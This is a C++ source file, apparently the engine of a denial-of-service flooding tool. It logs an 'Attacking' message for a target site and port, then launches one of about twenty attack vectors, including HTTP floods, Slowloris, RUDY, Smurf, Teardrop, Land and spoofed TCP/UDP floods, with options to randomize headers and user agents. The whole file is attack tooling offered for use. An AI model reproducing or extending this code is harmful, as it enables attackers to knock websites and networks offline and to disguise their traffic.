#include <unistd.h>
#include <array>
#include <memory>

#include "../Headers/Engine.hpp"
#include "../Headers/Attack_Vectors.hpp"

void Engine::run() {
    std::unique_ptr<Attack_Vector> flood;
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    conf->logger->Log(&message, Logger::Warning);
    message = "Delay: " + std::to_string(conf->delay) + " microsecs";
    conf->logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case Config::HTTP:
            conf->logger->Log("Attack Vector: HTTP", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::NullTCP:
            conf->logger->Log("Attack Vector: NullTCP", Logger::Info);
            flood = std::make_unique<Null_Flood>(conf);
            break;
        case Config::NullUDP:
            conf->logger->Log("Attack Vector: NullUDP", Logger::Info);
            flood = std::make_unique<Null_Flood>(conf);
            break;
        case Config::UDPFlood:
            conf->logger->Log("Attack Vector: UDPFlood", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::TCPFlood:
            conf->logger->Log("Attack Vector: TCPFlood", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::Slowloris:
            conf->logger->Log("Attack Vector: Slowloris", Logger::Info);
            flood = std::make_unique<Slowloris>(conf);
            break;
        case Config::Rudy:
            conf->logger->Log("Attack Vector: Rudy", Logger::Info);
            flood = std::make_unique<Slowloris>(conf);
            break;
        case Config::ICMPFlood:
            conf->logger->Log("Attack Vector: ICMP Flood", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        case Config::Blacknurse:
            conf->logger->Log("Attack Vector: Black Nurse", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        case Config::SpoofedSyn:
            conf->logger->Log("Attack Vector: Spoofed Syn Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedAck:
            conf->logger->Log("Attack Vector: Spoofed Ack Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedRST:
            conf->logger->Log("Attack Vector: Spoofed Rst Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedURG:
            conf->logger->Log("Attack Vector: Spoofed Urg Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedPUSH:
            conf->logger->Log("Attack Vector: Spoofed Push Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedFin:
            conf->logger->Log("Attack Vector: Spoofed Fin Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedUDP:
            conf->logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
            flood = std::make_unique<Spoofed_UDP_Flood>(conf);
            break;
        case Config::Beast:
            conf->logger->Log("Attack Vector: Beast", Logger::Info);
            flood = std::make_unique<Beast>(conf);
            break;
        case Config::TearDrop:
            conf->logger->Log("Attack Vector: Teardrop", Logger::Info);
            flood = std::make_unique<Spoofed_UDP_Flood>(conf);
            break;
        case Config::Land:
            conf->logger->Log("Attack Vector: Land", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::Smurf:{
            conf->logger->Log("Attack Vector: Smurf", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        }
        default:break;
    }
    if(conf->UseSSL){
        conf->logger->Log("SSL Enabled", Logger::Info);
    }
    if(conf->RandomizeHeader){
        conf->logger->Log("Header Randomization Enabled", Logger::Info);
    }
    if(conf->RandomizeUserAgent){
        conf->logger->Log("Useragent Randomization Enabled", Logger::Info);
    }
    conf->logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);
    flood->run();
}

Engine::Engine(std::shared_ptr<Config> conf) : conf{conf}{

}
